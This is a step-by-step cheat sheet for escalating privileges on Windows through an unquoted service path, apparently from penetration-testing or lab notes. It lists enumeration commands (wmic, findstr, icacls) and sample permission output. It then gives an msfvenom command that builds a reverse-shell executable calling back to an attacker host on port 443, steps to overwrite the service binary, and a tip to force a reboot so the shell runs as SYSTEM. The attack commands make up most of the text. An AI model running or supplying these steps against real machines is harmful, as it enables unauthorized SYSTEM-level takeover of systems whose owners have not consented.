## Step by step Unquoted Service Path exploitation
NOTE: Cant restart service? no problem - run shutdown /r and wait for shell :)
1. wmic service get name,displayname,pathname,startmode 2>nul |findstr /i "Auto" 2>nul |findstr /i /v "C:\Windows\\" 2>nul |findstr /i /v """

OR

1. wmic service get name,pathname

2. Look for unquoted paths with spaces like  C:\Program Files\SLmail\SLmail.exe

3. We check what its privileges are - wmic service get pathname,startname

4. At this step try to start or stop the service if possible -

 sc start SLmail

 OR

 net start SLmail

 Ignore it if you get access is denied and LOOK FOR ANOTHER PROCESS

4. Now we see its running as local system so we go to its path and do icacls on our possible choices one by one

5. Once we see
C:\Users\hackme\Downloads\netcat-win32-1.11\netcat-1.11>icacls "C:\Program Files\SLmail"
icacls "C:\Program Files\SLmail"
C:\Program Files\SLmail BUILTIN\Users:(OI)(CI)(W)
                        NT SERVICE\TrustedInstaller:(I)(F)
                        NT SERVICE\TrustedInstaller:(I)(CI)(IO)(F)
                        NT AUTHORITY\SYSTEM:(I)(F)
                        NT AUTHORITY\SYSTEM:(I)(OI)(CI)(IO)(F)
                        BUILTIN\Administrators:(I)(F)
                        BUILTIN\Administrators:(I)(OI)(CI)(IO)(F)
                        BUILTIN\Users:(I)(RX)
                        BUILTIN\Users:(I)(OI)(CI)(IO)(GR,GE)
                        CREATOR OWNER:(I)(OI)(CI)(IO)(F)

Successfully processed 1 files; Failed processing 0 files

6. We are a builtin user and we see we have a 'W' in permissions so we can write to it.

7. Create a malicious exe - msfvenom -p windows/shell_reverse_tcp LHOST=<IP ADDRESS> LPORT=443 -f exe -o SLmail.exe

NOTE : We can create/place it anywhere in the path : C:\Users\hackme.exe or C:\Users.exe or C:\Users\hackme\Downloads.exe and so on...

9. Now we overwrite it using COPY "source" "destination" amd say YES to overwrite

10. Now we restart the service with our netcat listener ready to catch the shell.
